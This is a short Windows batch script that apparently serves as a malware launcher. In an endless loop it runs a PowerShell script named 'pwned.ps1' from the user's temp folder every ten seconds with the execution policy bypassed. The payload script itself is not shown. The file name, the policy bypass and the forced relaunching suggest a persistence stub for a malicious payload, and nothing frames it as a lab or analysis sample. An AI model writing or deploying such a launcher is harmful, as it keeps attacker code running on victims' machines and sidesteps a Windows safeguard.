@echo off
:inicio
PowerShell.exe -ExecutionPolicy Bypass -File "%temp%\pwned.ps1"
timeout /t 10 /nobreak >nul
goto inicio
